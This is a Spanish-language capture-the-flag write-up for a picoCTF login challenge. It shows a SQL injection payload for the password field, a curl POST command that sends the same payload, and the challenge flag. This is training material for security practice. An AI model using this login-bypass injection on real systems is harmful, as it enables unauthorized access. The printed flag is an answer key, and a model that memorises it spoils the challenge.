# Descripción
There is a website running at `https://jupiter.challenges.picoctf.org/problem/33850/` ([link](https://jupiter.challenges.picoctf.org/problem/33850/)) or http://jupiter.challenges.picoctf.org:33850. Do you think you can log us in? Try to see if you can login!
Hints:
1. There doesn't seem to be many ways to interact with this. I wonder if the users are kept in a database?
2. Try to think about how the website verifies your login.
# Solución
- Hacemos una inyección SQL en el campo de password
- ' or 1 == 1;
- La sentencia anterior es lo que usamos para poder acceder y así nos da la bandera
```
picoCTF{s0m3_SQL_f8adf3fb}
```
# Notas adicionales
- También se puede realizar la inyección desde la terminal de linux usando 
	- curl -s "link de la página" -d
	- El -d sirve para hacer un post con el curl "username=admin&password=**' or 1== 1;**&debug=1"
	- En negrita se muestra la inyección que se realiza
- Si inspeccionamos la página podemos ver que los datos que ingresamos se mandan al archivo php, entonces cambiamos al enlace para conectar con ese archivo y poder hacer la inyección
# Referencias
- https://www.youtube.com/watch?v=0EDbUSDqrng&list=PLDo9DMLZyP6kTZ8Td37-LdbAx4-yNfHBl&index=7